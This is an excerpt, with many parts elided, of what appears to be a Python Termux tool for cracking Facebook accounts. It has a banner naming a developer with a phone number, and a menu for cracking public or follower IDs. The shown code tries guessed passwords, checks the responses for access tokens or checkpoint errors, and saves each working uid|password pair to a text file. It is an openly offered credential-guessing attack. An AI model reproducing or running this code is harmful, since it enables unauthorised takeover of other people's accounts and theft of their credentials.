...
logo = """
     ...
     \033[1;92m╚═╝░░╚═╝╚══════╝╚═╝
\033[1;93m-----------------------------------------------------
 \033[1;93m(*)\033[1;92m Developer: ALI RAZA
 \033[1;93m(*)\033[1;92m WhatsApp :   03047269778
 \033[1;93m(*)\033[1;92m FB PAGE   : AR TERMUX TRICK
\033[1;93m-----------------------------------------------------
"""
def tool():
	os.system("clear")
...
def menu():
    ...
    print(logo)
    print("")
    print("\x1b[1;92m            ASALAM O ALAIKUM : "+name)
    print("")
    print(47*"-")
    print("")
...
def crack():
	...
	print("")
	print(47*"\x1b[1;92m-")
	print("\x1b[1;92m[1]\x1b[1;93m Crack With Public Id")
	print("\x1b[1;92m[2]\x1b[1;93m Crack With Followers Id")
									...
									if "access_token" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [ALICP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("ALIcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [ALI-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("ALIcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
